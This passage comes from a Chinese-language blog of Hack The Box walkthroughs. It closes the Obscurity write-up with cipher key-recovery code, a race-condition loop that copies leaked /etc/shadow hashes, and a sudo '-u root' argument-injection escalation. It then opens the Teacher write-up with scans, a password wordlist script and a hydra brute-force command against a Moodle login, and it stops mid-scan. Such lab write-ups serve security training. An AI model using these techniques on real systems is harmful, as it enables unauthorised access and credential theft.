= chr((newChr - ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        decrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Encrypt with 0bscura\&#x27;s encryption algorithm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;InFile&#x27;</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">&#x27;The file to read&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;OutFile&#x27;</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">&#x27;Where to output the encrypted/decrypted file&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-k&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;Key&#x27;</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">&#x27;Key to use&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, help=<span class="string">&#x27;Decrypt mode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">banner = <span class="string">&quot;################################\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;#           BEGINNING          #\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;################################\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  ############################\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  #        FILE MODE         #\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  ############################&quot;</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">if</span> args.o == <span class="literal">None</span> <span class="keyword">or</span> args.k == <span class="literal">None</span> <span class="keyword">or</span> args.i == <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">&quot;Missing args&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.d:</span><br><span class="line">        print(<span class="string">&quot;Opening file &#123;0&#125;...&quot;</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Decrypting...&quot;</span>)</span><br><span class="line">        decrypted = decrypt(data, args.k)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Writing to &#123;0&#125;...&quot;</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Opening file &#123;0&#125;...&quot;</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Encrypting...&quot;</span>)</span><br><span class="line">        encrypted = encrypt(data, args.k)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Writing to &#123;0&#125;...&quot;</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(encrypted)</span><br></pre></td></tr></table></figure>
<p><a href="http://BetterSSH.py">BetterSSH.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">session = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;authenticated&quot;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = input(<span class="string">&quot;Enter username: &quot;</span>)</span><br><span class="line">    passW = input(<span class="string">&quot;Enter password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/etc/shadow&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">&quot;:&quot;</span>) <span class="keyword">if</span> <span class="string">&quot;$&quot;</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line"></span><br><span class="line">    passwordFile = <span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;\n&#x27;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    salt = <span class="string">&quot;&quot;</span></span><br><span class="line">    realPass = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">&#x27;user&#x27;</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">&#x27;$&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid user&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    salt = <span class="string">&#x27;$6$&#x27;</span>+salt+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">&quot;Authed!&quot;</span>)</span><br><span class="line">        session[<span class="string">&#x27;authenticated&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Incorrect pass&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">&#x27;/tmp/SSH/&#x27;</span>,path))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;authenticated&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;@Obscure$ &quot;</span>)</span><br><span class="line">        cmd = [<span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>,  session[<span class="string">&#x27;user&#x27;</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">&#x27;Output: &#x27;</span> + o.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        print(<span class="string">&#x27;Error: &#x27;</span>  + e.decode(<span class="string">&#x27;ascii&#x27;</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">&#x27;ascii&#x27;</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>现在已知条件是明文check.txt，密文out.txt，以及加密算法encrypt，求解密钥，爆破Python代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;check.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mingwen = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    miwen = f.read()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(len(mingwen)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">            ch = chr((ord(miwen[c]) - i) % <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">if</span> ch == mingwen[c]:</span><br><span class="line">                key += chr(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>
<p>得到密钥<code>alexandrovich</code>，解密<code>passwordreminder.txt</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200306193554.png" alt=""></p>
<p>使用这个密码登录robert的SSH终端，获得user.txt。</p>
<p><code>sudo -l</code>查看能够以root身份执行的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">robert@obscure:~$ sudo -l</span><br><span class="line">Matching Defaults entries for robert on obscure:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User robert may run the following commands on obscure:</span><br><span class="line">    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;home&#x2F;robert&#x2F;BetterSSH&#x2F;BetterSSH.py</span><br></pre></td></tr></table></figure>
<p>审计源码发现关键点：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/etc/shadow&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">data = [(p.split(<span class="string">&quot;:&quot;</span>) <span class="keyword">if</span> <span class="string">&quot;$&quot;</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">passwords = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">        passwords.append(x)</span><br><span class="line"></span><br><span class="line">passwordFile = <span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;\n&#x27;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(passwordFile)</span><br></pre></td></tr></table></figure>
<p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    files = os.listdir(<span class="string">&quot;./SSH&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        shutil.copy(os.path.join(<span class="string">&quot;./SSH&quot;</span>, file), <span class="string">&quot;./flag&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200308225922.png" alt=""></p>
<p>再用John光速解密得到mercedes，提权</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200308230202.png" alt=""></p>
<p>还有一种更常规的提权方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;authenticated&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;@Obscure$ &quot;</span>)</span><br><span class="line">        cmd = [<span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>,  session[<span class="string">&#x27;user&#x27;</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br></pre></td></tr></table></figure>
<p><code>sudo -u robert -u root</code>会覆盖前面一个<code>-u</code>的参数值。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200309101541.png" alt=""></p>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Obscurity靶机是我做的第一个不是CVE类型的靶机，源码审计起来有些吃力，多看看这种类型的应该会好一些。首先是服务器源码存在命令注入，可以执行系统命令从而反弹shell，以<code>www-data</code>的身份登录靶机。然后作者提供了一个密文、明文以及加解密算法，让我们写脚本爆破出密钥，通过这个密钥得到robert用户的登录密码，得到<code>user.txt</code>。然后在<code>BetterSSH.py</code>中存在两处可以利用的漏洞，第一处漏洞有点类似于条件竞争，用一个死循环的脚本把<code>BetterSSH.py</code>从<code>/etc/shadow</code>复制到<code>/tmp/SSH</code>的文件再次复制到一个自定义的目录下面，从而得到<code>root</code>的密码。第二处漏洞，虽然<code>-u</code>参数指定了当前用户的权限执行命令，但是用户输入的第二个<code>-u root</code>可以覆盖掉第一个<code>-u</code>参数从而绕过。总的来说，审计代码和编写代码的能力都有待加强。</p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Teacher Walkthrough</title>
    <url>/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Teacher-Walkthrough">HTB::Teacher Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322120324.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>nikto</li>
<li>dirb</li>
<li>dirsearch</li>
<li>hydra</li>
<li>hash-identifier</li>
<li>Moodle 3.4.1 - Remote Code Execute</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap扫描靶机TCP端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">λ nmap -sV -A -Pn -T4 10.10.10.153</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-22 13:08 ?D1ú±ê×?ê±??</span><br><span class="line">Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 56.13% done; ETC: 13:08 (0:00:04 remaining)</span><br><span class="line">Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% done; ETC: 13:08 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.10.153</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Blackhat highschool</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;22%OT&#x3D;80%CT&#x3D;1%CU&#x3D;39891%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E76F2E</span><br><span class="line">OS:3%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;104%GCD&#x3D;1%ISR&#x3D;10A%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8</span><br><span class="line">OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54DST11NW7%O2&#x3D;M54DST11NW7%O3&#x3D;M54DNNT11NW7%O4&#x3D;M54D</span><br><span class="line">OS:ST11NW7%O5&#x3D;M54DST11NW7%O6&#x3D;M54DST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%W</span><br><span class="line">OS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54DNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y</span><br><span class="line">OS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F</span><br><span class="line">OS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%</span><br><span class="line">OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD</span><br><span class="line">OS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE</span><br><span class="line">OS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 110&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   230.00 ms 10.10.14.1</span><br><span class="line">2   232.00 ms 10.10.10.153</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 41.73 seconds</span><br></pre></td></tr></table></figure>
<p>用dirsearch扫描网站</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[01:00:42] 301 -  310B  - &#x2F;css  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;css&#x2F;                                     [01:00:54] 301 -  312B  - &#x2F;fonts  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;fonts&#x2F;                                 [01:01:01] 301 -  313B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;images&#x2F;                               [01:01:03] 200 -    8KB - &#x2F;index.html                                                           [01:01:06] 301 -  317B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;javascript&#x2F;                       [01:01:07] 301 -  309B  - &#x2F;js  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;js&#x2F;</span><br><span class="line">[01:01:15] 301 -  313B  - &#x2F;manual  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;manual&#x2F;</span><br><span class="line">[01:01:15] 200 -  626B  - &#x2F;manual&#x2F;index.html</span><br><span class="line">[01:01:19] 301 -  313B  - &#x2F;moodle  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>去看一下images目录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322132156.png" alt=""></p>
<p>一个个点开看一下，发现<code>5.png</code>无法显示，应该不是一个图片，下载后用Notepad++打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi Servicedesk,</span><br><span class="line"></span><br><span class="line">I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.</span><br><span class="line"></span><br><span class="line">Could you guys figure out what the last charachter is, or just reset it?</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">Giovanni</span><br></pre></td></tr></table></figure>
<p>让我们猜解密码的最后一位，但是现在不知道用户名和密码是用在哪登录的，再去看<code>moodle</code>目录</p>
<blockquote>
<p>Moodle是一个开源课程管理系统（CMS），也被称为学习管理系统（LMS）或虚拟学习环境（VLE）。它已成为深受世界各地教育工作者喜爱的一种为学生建立网上动态网站的工具。</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322145643.png" alt=""></p>
<p>用hydra爆破密码之前先用Python生成一个密码字典：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;pwd.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        f.write(<span class="string">&#x27;Th4C00lTheacha&#123;&#125;\n&#x27;</span>.format(chr(i)))</span><br></pre></td></tr></table></figure>
<p>再用hydra进行密码爆破，由于只有在我们提交正确的密码后才设置Cookie，因此我们会在<code>Set-Cookie</code>上将其匹配为正确的响应。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form &quot;&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie&quot;</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-03-22 04:23:47</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1&#x2F;p:128), ~8 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;10.10.10.153:80&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie</span><br><span class="line">[80][http-post-form] host: 10.10.10.153   login: giovanni   password: Th4C00lTheacha#</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2020-03-22 04:23:58</span><br></pre></td></tr></table></figure>
<p>找到了密码<code>login: giovanni&amp;password: Th4C00lTheacha#</code>。</p>
<p>同时用nikto扫描一下有用的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nikto -host http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle                                                         - Nikto v2.1.6                                                                                   ---------------------------------------------------------------------------                     + Target IP:          10.10.10.153                                                               + Target Hostname:    10.10.10.153</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-22 02:49:41 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">+ Cookie MoodleSession created without the httponly flag</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header &#39;content-script-type&#39; found, with contents: text&#x2F;javascript</span><br><span class="line">+ Uncommon header &#39;content-style-type&#39; found, with contents: text&#x2F;css</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span><br><span class="line">+ Apache&#x2F;2.4.25 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.</span><br><span class="line">+ &#x2F;moodle&#x2F;config.php: PHP Config file may contain database IDs and passwords.</span><br><span class="line">+ Uncommon header &#39;x-accel-buffering&#39; found, with contents: no</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;auth&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;backup&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;backup&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;install&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;install&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;lib&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;pix&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;pix&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;INSTALL.txt: Default file found.</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;repository&#x2F;: Directory indexing found.</span><br><span class="line">+ &#x2F;moodle&#x2F;repository&#x2F;: CRX WebDAV upload</span><br><span class="line">+ &#x2F;moodle&#x2F;composer.json: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;</span><br><span class="line">+ &#x2F;moodle&#x2F;composer.lock: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;</span><br><span class="line">+ &#x2F;moodle&#x2F;package.json: Node.js package file found. It may contain sensitive information.</span><br><span class="line">+ 7871 requests: 0 error(s) and 26 item(s) reported on remote host</span><br><span class="line">+ End Time:           